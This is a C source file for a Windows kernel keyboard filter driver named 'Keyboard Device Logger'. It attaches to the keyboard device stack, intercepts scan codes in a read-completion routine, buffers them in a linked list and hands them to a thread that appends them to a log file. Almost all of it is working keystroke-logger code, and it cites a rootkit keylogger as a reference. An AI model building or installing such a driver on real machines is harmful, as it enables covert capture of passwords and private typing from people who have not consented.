/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the WDM related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/ 
 *
 */

#include "kdl.h"
#include "kdlthread.h"
#include "kdlkeyfilter.h"
#include "kdlregistry.h"

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Set up the dispatch functions we want to process, *ALL* others link to 
 * KDL_DispatchPassThrough()
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, 
					  IN PUNICODE_STRING theRegistryPath )
{

int i;

UNREFERENCED_PARAMETER( theRegistryPath );

KdPrint( ("KDL: DriverEntry() Loading Driver.\n") );

    // Save our registry entry for later use
    gRegistryPath.Length        = theRegistryPath->Length;
    gRegistryPath.MaximumLength = theRegistryPath->Length + sizeof( UNICODE_NULL );

    gRegistryPath.Buffer = ( PWCHAR ) ExAllocatePoolWithTag( NonPagedPool,
                                                             gRegistryPath.MaximumLength,
                                                             POOL_TAG_GREGISTRY );
    if ( gRegistryPath.Buffer == NULL )
    {
     return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlCopyUnicodeString( &gRegistryPath, theRegistryPath );

    // Loop through all the IRP_MJ_XXX Functions and attach DispatchPassThrough() to them
	for ( i=0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ ) 
    {
     theDriverObject->MajorFunction[i] = KDL_DispatchPassThrough;
    }

    // WDM Compatability
    theDriverObject->MajorFunction[IRP_MJ_POWER] = KDL_DispatchPower;
    theDriverObject->MajorFunction[IRP_MJ_PNP]   = KDL_DispatchPNP;
    theDriverObject->MajorFunction[IRP_MJ_READ]  = KDL_DispatchRead;

	// Setup a callback so we can flush the list cache when we shutdown
	theDriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = KDL_DispatchShutdown;

   // Register DriverUnload Function
   theDriverObject->DriverUnload = KDL_DriverUnload;
   // Register AddDevice Function
   theDriverObject->DriverExtension->AddDevice = KDL_AddDevice;

 return STATUS_SUCCESS;
}

/*
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Handle any clean up when the system is shutdown
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_DispatchShutdown( IN PDEVICE_OBJECT theDeviceObject, 
							   IN PIRP theIRP )
{

PDEVICE_EXTENSION theDeviceExtension;

  theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension; 
  
   // Tear down our thread
   DestroyLoggingThread( theDeviceObject );
   // Delete our lookaside list
   ExDeleteNPagedLookasideList( theDeviceExtension->LookList );
   // Free our working pointer to the lookaside list
   ExFreePoolWithTag( theDeviceExtension->LookList, POOL_TAG_LOOKLIST );

  // Close our log file handle
  ZwClose( theDeviceExtension->LogFile );

 return STATUS_SUCCESS;
}

/*
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Clean up of anything we left open or in memory
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID KDL_DriverUnload( IN PDRIVER_OBJECT theDriverObject )
{

KdPrint( ("KDL: KDL_DriverUnload() UnLoading Driver.\n") );

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * PNP Manager call for each device that this filter might be attached too.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_AddDevice( IN PDRIVER_OBJECT theDriverObject, 
				        IN PDEVICE_OBJECT thePhysicalDeviceObject )
{

NTSTATUS           Status;
PDEVICE_OBJECT     theDeviceObject;
PDEVICE_EXTENSION  theDeviceExtension;

KdPrint( ("KDL: KDL_AddDevice() Called.\n") );

           // DDK: "creates a device object for use by a driver."
  Status = IoCreateDevice( theDriverObject,           // Driver Object
	                       sizeof( DEVICE_EXTENSION ),// DeviceExtension Size
						   NULL,                      // Device Name
						   FILE_DEVICE_KEYBOARD,      // DeviceType
						   0,                         // DeviceCharacteristics
						   FALSE,                     // Exculsive
						   &theDeviceObject );        // *DeviceObject
   // Error Check
   if ( !NT_SUCCESS( Status ) )
   {
    return Status;
   }

KdPrint( ("KDL: IoCreateDevice() Successfull.\n") );

   // Zero out the DEVICE_EXTENSION structure before we use it
   RtlZeroMemory( theDeviceObject->DeviceExtension, sizeof( DEVICE_EXTENSION ) );
   // Setup our DEVICE_EXTENSION struct for local use
   theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;
   // Attach our device to the stack and keep the pointer to the device below us
   theDeviceExtension->LowerDeviceObject = IoAttachDeviceToDeviceStack( theDeviceObject , 
	                                                                    thePhysicalDeviceObject );
   // Make sure we attached to the device stack
   if ( theDeviceExtension->LowerDeviceObject == NULL ) 
   {
    IoDeleteDevice( theDeviceObject );

    return STATUS_DEVICE_NOT_CONNECTED; 
   }

KdPrint( ("KDL: IoAttachDeviceToDeviceStack() Successful.\n") );

    // Keep a reference to ourself in the Device Extension
    theDeviceExtension->thisDeviceObject = ( PDEVICE_OBJECT ) theDeviceObject;
    // Grabbed From Device Tree - Open System Resources
    theDeviceObject->Flags |= ( DO_BUFFERED_IO | DO_POWER_PAGABLE );
	// Init our spinlock for protected access to our list linked list of key data
	KeInitializeSpinLock( &theDeviceExtension->SpinLock );
	// Init our sempahore for timing access to our logging thread
	KeInitializeSemaphore( &theDeviceExtension->Semaphore,// Semaphore
		                   0,                             // Count
						   MAXLONG );                     // Limit
    // Allocate a pointer for our lookaside list
    theDeviceExtension->LookList =  ExAllocatePoolWithTag( NonPagedPool, 
					                                       sizeof( NPAGED_LOOKASIDE_LIST ), 
					                                       POOL_TAG_LOOKLIST );
    // Init our lookaside list
    ExInitializeNPagedLookasideList( theDeviceExtension->LookList,// Lookaside
			 				         NULL,                        // Allocate
								     NULL,                        // Free
								     0,                           // Flags
							         sizeof( KEY_DATA ),          // Size
							         POOL_TAG_INITLOOKLIST,       // Tag
								     0 );                         // Depth
    // Init the Linked list of keys we stored to pass onto logging thread
    InitializeListHead( &theDeviceExtension->ListHead );
    // Register a shutdown callback so we call clean up after ourselves at shutdown
	IoRegisterShutdownNotification( theDeviceObject );



///////////////////////////
// If plans to have the driver ability to unload and keep the system running look into
// IoInitializeRemoveLock
//////////////////////


   // Clear the flag
   theDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; 

 return STATUS_SUCCESS;
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Pass *ALL* the IRP_MJ_XXX Functions we do not (or can not) handle to the next lower 
 * object in the stack. 
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_DispatchPassThrough( IN PDEVICE_OBJECT theDeviceObject, 
							      IN PIRP theIRP )
{

KdPrint( ("KDL: KDL_DispatchPassThrough() Called.\n") );

  // DDK : "Returns a pointer to the caller's stack location in the given IRP."
  IoSkipCurrentIrpStackLocation( theIRP );
        // DDK : "Sends an IRP to the driver associated with a specified device object." 
 return IoCallDriver( (( PDEVICE_EXTENSION )theDeviceObject->DeviceExtension)->LowerDeviceObject, theIRP ); 
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * PNP Power request that we just pass on to the lower device object
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_DispatchPower( IN PDEVICE_OBJECT theDeviceObject, 
					        IN PIRP theIRP )
{

PDEVICE_EXTENSION  theDeviceExtension;

KdPrint( ("KDL: KDL_DispatchPower() Called.\n") );

   theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;

   // DDK : "Signals the power manager that the driver is ready to handle the next power IRP."
   PoStartNextPowerIrp( theIRP );
   // DDK : "Macro modifies the system's IO_STACK_LOCATION array pointer, so that when the 
   //        current driver calls the next-lower driver, that driver receives the same 
   //        IO_STACK_LOCATION structure that the current driver received. "
   IoSkipCurrentIrpStackLocation( theIRP );
        // DDK : "Passes a power IRP to the next-lower driver in the device stack."
 return PoCallDriver( theDeviceExtension->LowerDeviceObject, theIRP );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Set IoSetCompletionRoutine() so that we can gleam the key data from the IRP on its 
 * way back up the stack.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_DispatchRead ( IN PDEVICE_OBJECT theDeviceObject, 
					        IN PIRP theIRP )
{

KdPrint( ("KDL: KDL_DispatchRead() Called.\n") );

    // DDK : "Copies the IRP stack parameters from the current I/O stack 
    //        location to the stack location of the next-lower driver."
    IoCopyCurrentIrpStackLocationToNext( theIRP );
    // DDK : "Macro registers an IoCompletion routine, which will be called when the 
	//        next-lower-level driver has completed the requested operation for the given IRP."
    IoSetCompletionRoutine( theIRP,          // IRP
		                    KDL_ReadComplete,// CompletionRoutine 
                            theDeviceObject, // Context
						    TRUE,            // InvokeOnSuccess
						    TRUE,            // InvokeOnError
						    TRUE );          // InvokeOnCancel

	    // DDK : "sends an IRP to the driver associated with a specified device object."
 return IoCallDriver( (( PDEVICE_EXTENSION )theDeviceObject->DeviceExtension)->LowerDeviceObject, theIRP ); 
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * PNP Manager calls and how we will handle them in this driver.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_DispatchPNP( IN PDEVICE_OBJECT theDeviceObject, 
					      IN PIRP theIRP )
{

PDEVICE_EXTENSION    theDeviceExtension; 
PIO_STACK_LOCATION   irpStack;
NTSTATUS             Status = STATUS_SUCCESS;

KdPrint( ("KDL: KDL_DispatchPNP() Called.\n") );

    theDeviceExtension = (PDEVICE_EXTENSION) theDeviceObject->DeviceExtension;
	// DDK : "returns a pointer to the caller's stack location in the given IRP."
    irpStack = IoGetCurrentIrpStackLocation( theIRP );

    switch ( irpStack->MinorFunction ) 
	{
    case IRP_MN_REMOVE_DEVICE:
		{
KdPrint( ("KDL: KDL_DispatchPNP() -MinorFunction - IRP_MN_REMOVE_DEVICE Called.\n") );

////////////////////////
// Using IoInitializeRemoveLock type mechanism is going to be needed here
///////////////////////


         IoSkipCurrentIrpStackLocation( theIRP );
         IoCallDriver( theDeviceExtension->LowerDeviceObject, theIRP );
         // DDK : "Releases an attachment between the caller's device object and a lower 
		 //        driver's device object."
         IoDetachDevice( theDeviceExtension->LowerDeviceObject ); 

         // Tear down our thread
         DestroyLoggingThread( theDeviceObject );
         // Delete our lookaside list
         ExDeleteNPagedLookasideList( theDeviceExtension->LookList );
         // Free our working pointer to the lookaside list
		 ExFreePoolWithTag( theDeviceExtension->LookList, POOL_TAG_LOOKLIST );

         // Close our log file handle
         ZwClose( theDeviceExtension->LogFile );

         // "DDK : "Removes a device object from the system, for example, when the 
         //         underlying device is removed from the system."
         IoDeleteDevice( theDeviceObject );

         Status = STATUS_SUCCESS;

         break;
		}
    case IRP_MN_START_DEVICE: 
		{
///////////////////////
// Not sure how USB keyboard will react here
//////////////////////
         // Create our thread for writting data too the logging file 
         CreateLoggingThread( theDeviceObject );
         // Set our linked list cache size
	     OpenRegKeyMaxList( theDeviceObject );
         // Create our log file
         OpenRegKeyStorage( theDeviceObject );
	     // We will no longer need the registry pointer so we set it free
		 // If we receive mutiple start irqs this statement is going to be a problem
         ExFreePoolWithTag( gRegistryPath.Buffer, POOL_TAG_GREGISTRY );

         // EOF reference to make sure we append new key data to the end of the log file
         theDeviceExtension->theEOF.HighPart = -1;
         theDeviceExtension->theEOF.LowPart = FILE_WRITE_TO_END_OF_FILE;


         IoSkipCurrentIrpStackLocation( theIRP );
         Status = IoCallDriver( theDeviceExtension->LowerDeviceObject, theIRP );

         break;
		}
    case IRP_MN_STOP_DEVICE:
    case IRP_MN_SURPRISE_REMOVAL:
    case IRP_MN_QUERY_REMOVE_DEVICE:
    case IRP_MN_QUERY_STOP_DEVICE:
    case IRP_MN_CANCEL_REMOVE_DEVICE:
    case IRP_MN_CANCEL_STOP_DEVICE:
    case IRP_MN_FILTER_RESOURCE_REQUIREMENTS: 
    case IRP_MN_QUERY_DEVICE_RELATIONS:
    case IRP_MN_QUERY_INTERFACE:
    case IRP_MN_QUERY_CAPABILITIES:
    case IRP_MN_QUERY_DEVICE_TEXT:
    case IRP_MN_QUERY_RESOURCES:
    case IRP_MN_QUERY_RESOURCE_REQUIREMENTS:
    case IRP_MN_READ_CONFIG:
    case IRP_MN_WRITE_CONFIG:
    case IRP_MN_EJECT:
    case IRP_MN_SET_LOCK:
    case IRP_MN_QUERY_ID:
    case IRP_MN_QUERY_PNP_DEVICE_STATE:
    default:
		{
         IoSkipCurrentIrpStackLocation( theIRP );
         Status = IoCallDriver( theDeviceExtension->LowerDeviceObject, theIRP );
         
		 break;
		}
    } // End switch ( irpStack->MinorFunction ) 

 return Status;
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Overlay the key data from the AssociatedIrp.SystemBuffer into our linked list and 
 * signal LogThreadFunc() that there is data to process. We cache key data until 
 * theDeviceExtension->MaxListSize is met then singal the thread to dump the list and 
 * write it to disk.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS KDL_ReadComplete( IN PDEVICE_OBJECT theDeviceObject,
                           IN PIRP theIRP,
                           IN PVOID Context )
{

int                       i;
int                       numKeys;
PKEYBOARD_INPUT_DATA      KeyData;
PDEVICE_EXTENSION         theDeviceExtension; 
PKEY_DATA                 theKeyData;


    theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;

KdPrint( ("KDL: KDL_ReadComplete() Called.\n") );

	if ( NT_SUCCESS( theIRP->IoStatus.Status ) ) 
	{
	 // Overlay the data from theIRP into a working structure
     KeyData = ( PKEYBOARD_INPUT_DATA ) theIRP->AssociatedIrp.SystemBuffer;
	 //
     numKeys = (int) ( theIRP->IoStatus.Information / sizeof( KEYBOARD_INPUT_DATA ) );

      for ( i = 0; i < numKeys; i++ ) 
	  {
       // Process a filter check on the key to see if it should be added to the list
	   if ( MatchKeyFilter( i, KeyData ) )
	   {
        // Grab some memory for the keydata stored in our linked list
        theKeyData = ( PKEY_DATA ) ExAllocateFromNPagedLookasideList( theDeviceExtension->LookList );

KdPrint( ("KDL: ExAllocatePoolWithTag() 0x%x\n", theKeyData) );

KdPrint( ("KDL: MakeCode: %x Flags: %d\n", KeyData[i].MakeCode, KeyData[i].Flags) );

        // Match up all the key data to our link list structure
		theKeyData->KeyUnitId    = KeyData[i].UnitId;
		theKeyData->KeyMakeCode  = KeyData[i].MakeCode;
		theKeyData->KeyFlags     = KeyData[i].Flags;
        // Add the completed structure to the list
	    ExInterlockedInsertTailList( &theDeviceExtension->ListHead, // ListHead
			                         &theKeyData->ListEntry,        // ListEntry
			                         &theDeviceExtension->SpinLock);// Lock
		// Incrament our list size
		theDeviceExtension->CurrentListSize++;
        // If we are at our max list size then signal the thread that it is time to process the list
		if ( theDeviceExtension->CurrentListSize >= theDeviceExtension->MaxListSize )
		{
         // Signal logging thread we have entries in the list that need to be processed
         KeReleaseSemaphore( &theDeviceExtension->Semaphore,// Semaphore
		  	                 0,                             // Increment
							 1,                             // Adjustment
							 FALSE );                       // Wait
         // After the thread has been signaled reset our counter for more list buffering
		 theDeviceExtension->CurrentListSize = 0;
		} // End if ( theDeviceExtension->CurrentListSize >= theDeviceExtension->MaxListSize )
	   } // End if ( MatchKeyFilter( KeyData ) )
      } // End for( i = 0; i < numKeys; i++ )
    } // End if( NT_SUCCESS( theIRP->IoStatus.Status ) ) 

    // DDK : "If a driver sets an IoCompletion routine for an IRP and then passes 
	//        the IRP down to a lower driver, the IoCompletion routine should check the 
	//        IRP->PendingReturned flag. If the flag is set, the IoCompletion routine must 
	//        call IoMarkIrpPending with the IRP"
    if( theIRP->PendingReturned ) 
	{
     IoMarkIrpPending( theIRP );
    }

KdPrint( ("KDL: theDeviceExtension->CurrentListSize %d\n", theDeviceExtension->CurrentListSize) );

 return theIRP->IoStatus.Status;
}